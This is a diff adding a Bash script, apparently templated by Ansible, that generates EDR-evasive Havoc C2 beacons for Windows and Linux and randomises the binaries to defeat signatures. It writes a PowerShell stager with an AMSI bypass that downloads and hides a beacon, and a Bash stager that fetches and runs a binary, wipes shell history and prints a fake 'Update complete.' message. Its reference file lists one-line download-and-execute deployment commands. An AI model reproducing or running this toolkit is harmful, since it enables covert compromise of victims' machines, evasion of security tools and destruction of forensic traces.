@@ -1,0 +1,456 @@
+#!/bin/bash
+# EDR-evasive beacon generator for Havoc C2
+# Every deployment produces completely unique payloads
+
+# Configuration (automatically populated by Ansible)
+HAVOC_DIR="/root/Tools/Havoc"
+BEACONS_DIR="/root/Tools/beacons"
+C2_HOST="{{ ansible_host }}"
+REDIRECTOR_HOST="{{ redirector_subdomain }}.{{ domain }}"
+REDIRECTOR_PORT="{{ redirector_port | default('9443') }}"
+PROFILE_FILE="$HAVOC_DIR/config/profile.json"
+
+# Ensure required directories exist
+mkdir -p $BEACONS_DIR/windows
+mkdir -p $BEACONS_DIR/linux
+mkdir -p $BEACONS_DIR/staged
+mkdir -p $BEACONS_DIR/shellcode
+
+# Load Havoc configuration from profile
+if [ -f "$PROFILE_FILE" ]; then
+    echo "[+] Loading Havoc configuration from profile..."
+    TEAMSERVER_PORT=$(jq -r '.teamserver_port' "$PROFILE_FILE")
+    ADMIN_USER=$(jq -r '.admin_user' "$PROFILE_FILE")
+    ADMIN_PASS=$(jq -r '.admin_pass' "$PROFILE_FILE")
+    HTTP_PORT=$(jq -r '.http_port' "$PROFILE_FILE")
+    HTTPS_PORT=$(jq -r '.https_port' "$PROFILE_FILE")
+else
+    echo "[!] Warning: Profile file not found, using default values"
+    TEAMSERVER_PORT=40056
+    ADMIN_USER="admin"
+    ADMIN_PASS="admin"
+    HTTP_PORT=8080
+    HTTPS_PORT=443
+fi
+
+# Generate unique random values for each execution
+random_string() { 
+    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-8} | head -n 1
+}
+
+# Anti-detection function to modify binary files
+modify_binary() {
+    local input_file=$1
+    
+    echo "[+] Applying anti-detection modifications to: $input_file"
+    
+    # Create a temporary file
+    local temp_file="${input_file}.tmp"
+    cp "$input_file" "$temp_file"
+    
+    # Modify the file based on its type
+    if file "$input_file" | grep -q "PE32"; then
+        # Windows EXE/DLL modifications
+        
+        # Add random bytes to end of file
+        dd if=/dev/urandom bs=1 count=$(( RANDOM % 1000 + 100 )) >> "$temp_file" 2>/dev/null
+        
+        # Modify PE header timestamps with random value
+        random_timestamp=$(printf '%08x' $(( RANDOM * RANDOM )))
+        printf "\\x${random_timestamp:0:2}\\x${random_timestamp:2:2}\\x${random_timestamp:4:2}\\x${random_timestamp:6:2}" | \
+            dd of="$temp_file" bs=1 seek=136 count=4 conv=notrunc 2>/dev/null
+        
+        # Try to strip debug information
+        if command -v strip &> /dev/null; then
+            strip --strip-debug "$temp_file" 2>/dev/null || true
+        fi
+        
+    elif file "$input_file" | grep -q "ELF"; then
+        # Linux ELF modifications
+        
+        # Add random bytes to end of file
+        dd if=/dev/urandom bs=1 count=$(( RANDOM % 500 + 50 )) >> "$temp_file" 2>/dev/null
+        
+        # Try to strip all symbols
+        if command -v strip &> /dev/null; then
+            strip --strip-all "$temp_file" 2>/dev/null || true
+        fi
+    fi
+    
+    # Replace original with modified version
+    mv "$temp_file" "$input_file"
+    
+    echo "[+] Binary modifications complete"
+}
+
+# Create advanced Havoc payload profile with evasion techniques
+generate_profile() {
+    local type=$1
+    local profile_name="${type}_profile_$(random_string 8).json"
+    
+    echo "[+] Creating evasive $type profile..."
+    
+    # Generate random values for this profile
+    local sleep_time=$(( RANDOM % 10 + 2 ))
+    local jitter_percent=$(( RANDOM % 50 + 10 ))
+    
+    if [ "$type" == "windows" ]; then
+        cat > "$BEACONS_DIR/$profile_name" << EOF
+{
+    "Listener": "https",
+    "Demon": {
+        "Sleep": ${sleep_time},
+        "SleepJitter": ${jitter_percent},
+        "IndirectSyscalls": true,
+        "Inject": {
+            "AllocationMethod": $(( RANDOM % 3 )),
+            "ExecutionMethod": $(( RANDOM % 3 )),
+            "ExecuteOptions": $(( RANDOM % 2 ))
+        },
+        "Evasion": {
+            "StackSpoofing": true,
+            "SleazeUnhook": true,
+            "AmsiEtwPatching": true,
+            "SyscallMethod": $(( RANDOM % 3 )),
+            "EnableSleepMask": true,
+            "SleepMaskTechnique": $(( RANDOM % 4 ))
+        },
+        "Binary": {
+            "Subsystem": $(( RANDOM % 2 + 1 ))
+        }
+    }
+}
+EOF
+    elif [ "$type" == "linux" ]; then
+        cat > "$BEACONS_DIR/$profile_name" << EOF
+{
+    "Listener": "https",
+    "Demon": {
+        "Sleep": ${sleep_time},
+        "SleepJitter": ${jitter_percent},
+        "Injection": {
+            "SpawnMethod": $(( RANDOM % 2 )),
+            "AllocationMethod": $(( RANDOM % 2 ))
+        },
+        "Evasion": {
+            "EnableSleepMask": true,
+            "SleepMaskTechnique": $(( RANDOM % 4 ))
+        }
+    }
+}
+EOF
+    fi
+    
+    echo "$profile_name"
+}
+
+# Generate Havoc payloads with EDR evasion techniques
+generate_payloads() {
+    echo "[+] Generating EDR-evasive Havoc beacons..."
+    
+    # Windows EXE
+    win_profile=$(generate_profile "windows")
+    win_output="update_win_$(random_string 8).exe"
+    echo "[+] Creating Windows beacon: $win_output with profile $win_profile"
+    
+    $HAVOC_DIR/Client/havoc headless \
+        --teamserver "127.0.0.1:$TEAMSERVER_PORT" \
+        --username "$ADMIN_USER" \
+        --password "$ADMIN_PASS" \
+        --daemon \
+        --generate payload \
+        --listener "https" \
+        --config "$BEACONS_DIR/$win_profile" \
+        --format exe \
+        --output "$BEACONS_DIR/windows/$win_output" \
+        > /dev/null 2>&1
+    
+    # Apply custom binary modifications
+    if [ -f "$BEACONS_DIR/windows/$win_output" ]; then
+        modify_binary "$BEACONS_DIR/windows/$win_output"
+    fi
+    
+    # Windows DLL
+    dll_profile=$(generate_profile "windows")
+    dll_output="module_$(random_string 8).dll"
+    echo "[+] Creating Windows DLL: $dll_output with profile $dll_profile"
+    
+    $HAVOC_DIR/Client/havoc headless \
+        --teamserver "127.0.0.1:$TEAMSERVER_PORT" \
+        --username "$ADMIN_USER" \
+        --password "$ADMIN_PASS" \
+        --daemon \
+        --generate payload \
+        --listener "https" \
+        --config "$BEACONS_DIR/$dll_profile" \
+        --format dll \
+        --output "$BEACONS_DIR/windows/$dll_output" \
+        > /dev/null 2>&1
+    
+    # Apply custom binary modifications
+    if [ -f "$BEACONS_DIR/windows/$dll_output" ]; then
+        modify_binary "$BEACONS_DIR/windows/$dll_output"
+    fi
+    
+    # Linux binary
+    linux_profile=$(generate_profile "linux")
+    linux_output="update_linux_$(random_string 8)"
+    echo "[+] Creating Linux binary: $linux_output with profile $linux_profile"
+    
+    $HAVOC_DIR/Client/havoc headless \
+        --teamserver "127.0.0.1:$TEAMSERVER_PORT" \
+        --username "$ADMIN_USER" \
+        --password "$ADMIN_PASS" \
+        --daemon \
+        --generate payload \
+        --listener "https" \
+        --config "$BEACONS_DIR/$linux_profile" \
+        --format elf \
+        --output "$BEACONS_DIR/linux/$linux_output" \
+        > /dev/null 2>&1
+    
+    # Apply custom binary modifications
+    if [ -f "$BEACONS_DIR/linux/$linux_output" ]; then
+        modify_binary "$BEACONS_DIR/linux/$linux_output"
+    fi
+    
+    # Windows shellcode (staged payload)
+    shellcode_profile=$(generate_profile "windows")
+    shellcode_output="shellcode_$(random_string 8).bin"
+    echo "[+] Creating Windows shellcode: $shellcode_output with profile $shellcode_profile"
+    
+    $HAVOC_DIR/Client/havoc headless \
+        --teamserver "127.0.0.1:$TEAMSERVER_PORT" \
+        --username "$ADMIN_USER" \
+        --password "$ADMIN_PASS" \
+        --daemon \
+        --generate payload \
+        --listener "https" \
+        --config "$BEACONS_DIR/$shellcode_profile" \
+        --format shellcode \
+        --output "$BEACONS_DIR/shellcode/$shellcode_output" \
+        > /dev/null 2>&1
+    
+    echo "[+] All payloads generated successfully!"
+    
+    # Return payload information
+    echo "$win_output:$dll_output:$linux_output:$shellcode_output"
+}
+
+# Generate PowerShell and bash stagers
+generate_stagers() {
+    win_output=$1
+    linux_output=$2
+    
+    echo "[+] Generating evasive stagers..."
+    
+    # Create PowerShell stager directory
+    mkdir -p $BEACONS_DIR/stagers
+    
+    # PowerShell stager with AMSI bypass and obfuscation
+    cat > $BEACONS_DIR/stagers/windows_stager.ps1 << 'EOF'
+# PowerShell stager for Havoc C2 with AMSI bypass
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
+# AMSI Bypass
+function Bypass-AMSI {
+    $a = [Ref].Assembly.GetTypes()
+    ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}}
+    $d = $c.GetFields('NonPublic,Static')
+    ForEach($e in $d) {if ($e.Name -like "*Context") {$f = $e}}
+    $g = $f.GetValue($null)
+    [IntPtr]$ptr = $g
+    [Int32[]]$buf = @(0)
+    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+}
+
+# Try to bypass AMSI
+try { Bypass-AMSI } catch {}
+
+# Randomize variables for evasion
+$rnd1 = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+$rnd2 = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+$rnd3 = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+
+# Error handling with obfuscation
+$ErrorActionPreference = 'SilentlyContinue'
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36")
+$wc.Headers.Add("Accept-Language", "en-US,en;q=0.9")
+$wc.Headers.Add("Referer", "https://REDIRECTOR_HOST/")
+
+# Split URL to avoid detection
+$r1 = "https://"
+$r2 = "REDIRECTOR_HOST"
+$r3 = "/content/windows/WINDOWS_EXE"
+$url = $r1 + $r2 + $r3
+
+# Download with jitter
+$outpath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "$rnd1.exe")
+try {
+    $wc.DownloadFile($url, $outpath)
+    Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 3000)
+    
+    # Start process with extra obfuscation
+    $p = New-Object System.Diagnostics.Process
+    $p.StartInfo.FileName = $outpath
+    $p.StartInfo.WindowStyle = 'Hidden'
+    $p.StartInfo.CreateNoWindow = $true
+    $p.Start()
+    
+} catch {
+    # Fail silently
+}
+EOF
+
+    # Replace placeholder values in PowerShell stager
+    sed -i "s/REDIRECTOR_HOST/$REDIRECTOR_HOST/g" $BEACONS_DIR/stagers/windows_stager.ps1
+    sed -i "s/WINDOWS_EXE/$win_output/g" $BEACONS_DIR/stagers/windows_stager.ps1
+
+    # Bash stager with obfuscation techniques
+    cat > $BEACONS_DIR/stagers/linux_stager.sh << 'EOF'
+#!/bin/bash
+# Linux download and execute Havoc beacon with EDR evasion
+
+# Function obfuscation
+function x() {
+    command -v "$1" > /dev/null 2>&1
+}
+
+# Random temp filename
+r() {
+    head /dev/urandom | tr -dc a-zA-Z0-9 | head -c${1:-10}
+}
+
+# Randomize variables
+TMPVAR=$(r)
+TMPFILE="/tmp/.${TMPVAR}"
+
+# Check which download tool is available
+if x curl; then
+    # Split URL to avoid signature detection
+    p1="https://"
+    p2="REDIRECTOR_HOST"
+    p3="/content/linux/LINUX_BINARY"
+    url="${p1}${p2}${p3}"
+    # Add random sleep between operations
+    sleep $(awk -v min=0.1 -v max=0.5 'BEGIN{srand(); print min+rand()*(max-min)}')
+    curl -s -o "$TMPFILE" "$url"
+elif x wget; then
+    p1="https://"
+    p2="REDIRECTOR_HOST"
+    p3="/content/linux/LINUX_BINARY"
+    url="${p1}${p2}${p3}"
+    # Add random sleep between operations
+    sleep $(awk -v min=0.1 -v max=0.5 'BEGIN{srand(); print min+rand()*(max-min)}')
+    wget -q -O "$TMPFILE" "$url"
+else
+    exit 1
+fi
+
+# Make executable and run in background
+chmod +x "$TMPFILE"
+# Add random sleep before execution
+sleep $(awk -v min=0.1 -v max=0.5 'BEGIN{srand(); print min+rand()*(max-min)}')
+("$TMPFILE" > /dev/null 2>&1 &)
+
+# Clean up command history if possible
+[ -f ~/.bash_history ] && cat /dev/null > ~/.bash_history 2>/dev/null
+history -c 2>/dev/null
+
+echo "Update complete."
+EOF
+
+    # Replace placeholder values in Bash stager
+    sed -i "s/REDIRECTOR_HOST/$REDIRECTOR_HOST/g" $BEACONS_DIR/stagers/linux_stager.sh
+    sed -i "s/LINUX_BINARY/$linux_output/g" $BEACONS_DIR/stagers/linux_stager.sh
+    chmod +x $BEACONS_DIR/stagers/linux_stager.sh
+    
+    echo "[+] Stagers created successfully"
+}
+
+# Create manifest file
+create_manifest() {
+    local payload_info=$1
+    local win_output=$(echo $payload_info | cut -d':' -f1)
+    local dll_output=$(echo $payload_info | cut -d':' -f2)
+    local linux_output=$(echo $payload_info | cut -d':' -f3)
+    local shellcode_output=$(echo $payload_info | cut -d':' -f4)
+    
+    echo "[+] Creating manifest file..."
+    cat > $BEACONS_DIR/manifest.json << EOF
+{
+  "windows_exe": "$win_output",
+  "windows_dll": "$dll_output",
+  "linux_binary": "$linux_output",
+  "windows_shellcode": "$shellcode_output",
+  "redirector_host": "$REDIRECTOR_HOST",
+  "redirector_port": "$REDIRECTOR_PORT",
+  "c2_host": "$C2_HOST",
+  "havoc_teamserver_port": "$TEAMSERVER_PORT",
+  "havoc_http_port": "$HTTP_PORT",
+  "havoc_https_port": "$HTTPS_PORT",
+  "generation_time": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
+}
+EOF
+}
+
+# Create reference file
+create_reference() {
+    local payload_info=$1
+    local win_output=$(echo $payload_info | cut -d':' -f1)
+    local dll_output=$(echo $payload_info | cut -d':' -f2)
+    local linux_output=$(echo $payload_info | cut -d':' -f3)
+    local shellcode_output=$(echo $payload_info | cut -d':' -f4)
+    
+    echo "[+] Creating reference file..."
+    cat > $BEACONS_DIR/reference.txt << EOF
+Havoc C2 Server Details:
+- C2 IP: $C2_HOST
+- Redirector Domain: $REDIRECTOR_HOST
+- Teamserver Port: $TEAMSERVER_PORT
+- Admin User: $ADMIN_USER
+- Admin Password: $ADMIN_PASS
+
+Beacons Generated ($(date)):
+- Windows EXE: $win_output (Path: $BEACONS_DIR/windows/$win_output)
+- Windows DLL: $dll_output (Path: $BEACONS_DIR/windows/$dll_output)
+- Linux Binary: $linux_output (Path: $BEACONS_DIR/linux/$linux_output)
+- Windows Shellcode: $shellcode_output (Path: $BEACONS_DIR/shellcode/$shellcode_output)
+
+Deployment Commands:
+- PowerShell:
+  powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('https://$REDIRECTOR_HOST/windows_stager.ps1')"
+
+- Linux:
+  curl -s https://$REDIRECTOR_HOST/linux_stager.sh | bash
+
+Anti-Detection Features Enabled:
+- Binary signature randomization
+- PE/ELF header manipulation
+- Sleep mask obfuscation
+- AMSI bypass in stagers
+- EDR unhooking
+- Indirect syscalls
+- Random sleep/jitter timing
+EOF
+}
+
+# Main execution flow
+echo "[+] Starting EDR-evasive Havoc beacon generation..."
+echo "[+] Redirector: $REDIRECTOR_HOST"
+echo "[+] C2 Host: $C2_HOST"
+
+# Generate payloads
+payload_info=$(generate_payloads)
+
+# Generate stagers
+generate_stagers $(echo $payload_info | cut -d':' -f1) $(echo $payload_info | cut -d':' -f3)
+
+# Create manifest file
+create_manifest "$payload_info"
+
+# Create reference file
+create_reference "$payload_info"
+
+echo "[+] EDR-evasive beacon generation complete!"
